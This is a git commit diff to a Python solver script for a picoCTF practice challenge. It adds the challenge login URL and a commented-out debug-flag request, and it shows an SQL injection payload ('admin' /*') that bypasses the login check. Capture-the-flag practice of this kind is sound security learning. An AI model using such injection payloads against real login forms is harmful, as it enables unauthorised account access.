581f81efc96b1eefff41d35f7c2ba59e1d855582
Tristan Gomez <gomez22@pdx.edu>
2021-08-10 13:48:28 -0700

    Update irishNameRepo2.py

--- picoGym/Irish-Name-Repo-2/irishNameRepo2.py
+++ picoGym/Irish-Name-Repo-2/irishNameRepo2.py
@@ -2,6 +2,17 @@ import requests
 
 s = requests.Session()
 
+url = 'https://jupiter.challenges.picoctf.org/problem/53751/login.php'
+
+# setDebugFlagPayload = {
+#   'username' : 'test',
+#   'password' : 'test',
+#   'debug' : '1'
+# }
+
+# resp = s.post(url, data=setDebugFlagPayload)
+# print(resp.text)
+
 exploit = {
     'username' : """admin' /*""",
     'password' : 'password',
